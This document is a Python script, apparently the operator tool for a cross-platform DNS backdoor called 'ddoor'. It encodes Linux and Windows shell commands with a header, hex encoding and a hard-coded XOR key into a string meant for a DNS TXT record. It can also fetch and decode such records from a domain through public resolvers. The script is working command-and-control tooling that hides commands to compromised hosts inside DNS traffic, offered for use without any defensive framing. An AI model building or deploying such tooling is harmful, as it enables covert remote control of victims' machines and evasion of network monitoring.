#!/usr/bin/python3
import binascii
import colorama
import argparse
import dns.resolver
from itertools import cycle

header = "!c"
xor_key = "ttest"

banner = colorama.Fore.GREEN +'''@@@@@@@   @@@@@@@    @@@@@@    @@@@@@   @@@@@@@   
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  
@!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@!!@!   
!@!  !!!  !@!  !!!  !@!  !!!  !@!  !!!  !!@!@!    
!!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!  !!: :!!   
:!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  
 :::: ::   :::: ::  ::::: ::  ::::: ::  ::   :::  
:: :  :   :: :  :    : :  :    : :  :    :   : :  ''' + colorama.Style.RESET_ALL

def retrv_txt(domain):
    cache = dns.resolver.Cache()
    cache.flush()
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [
        "1.1.1.1",     # Cloudflare
        "8.8.8.8",     # Google
    ]
    resolver.timeout = 10
    resolver.lifetime = 10
    try:
        answers = resolver.query(domain, "TXT")
        for rdata in answers:
            return rdata.to_text().replace('"', "")
    except Exception as e:
        pass
    return False

def parse_txt(txt_response):
    txt_decoded = h_decode(txt_response)
    if txt_decoded:
        unencrypted = h_decode(str_xor(txt_decoded, xor_key))
        if unencrypted.find("!c") != -1:
            unencrypted = unencrypted.split("!&")
            if len(unencrypted) == 2:
                linux_cmd = unencrypted[0][2:]
                windows_cmd = unencrypted[1]
                print("-"*25)
                print("OS\t\tCommand")
                print("-"*25)
                if linux_cmd:
                    print("Linux\t\t'{}'".format(linux_cmd))
                if windows_cmd:
                    print("Windows\t\t'{}'".format(windows_cmd))
                print("-"*25)
                return
            else:
                print("Malformed Command")
                return  
    print("Unable to properly unencrypt record")

def str_xor(data, key):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
    return xored

def h_decode(txt):
    try:
        return binascii.unhexlify(txt.encode("utf-8")).decode("utf-8")
    except Exception as e:
        #print("Hex Error: {}".format(e))
        pass
    return False

def h_encode(txt):
    return binascii.hexlify(txt.encode("utf-8")).decode("utf-8")

if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(description='ddoor, crossplatform dns backdoor')
    #group = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('-l', action="store", dest="linux_cmd", help="Linux Command", default="")
    parser.add_argument('-w', action="store", dest="windows_cmd", help="Windows Command", default="")
    parser.add_argument('-d', action="store", dest="domain_search", help="Domain to Check Commands On", default="")
    args = parser.parse_args()
    print("Using Header: '{}' Using Xor Pass: '{}'".format(header, xor_key))
    if args.domain_search:
        response = retrv_txt(args.domain_search)
        if response:
            parse_txt(response)
        else:
            print("No txt record found")
    elif args.windows_cmd or args.linux_cmd:
        encoded_header = h_encode(header + args.linux_cmd + "!&" + args.windows_cmd)
        encypted_header = h_encode(str_xor(encoded_header, xor_key))
        print("\t>> {} <<".format(encypted_header))
    else:
        parser.error("One of -d, -w, or -l must be provided.")
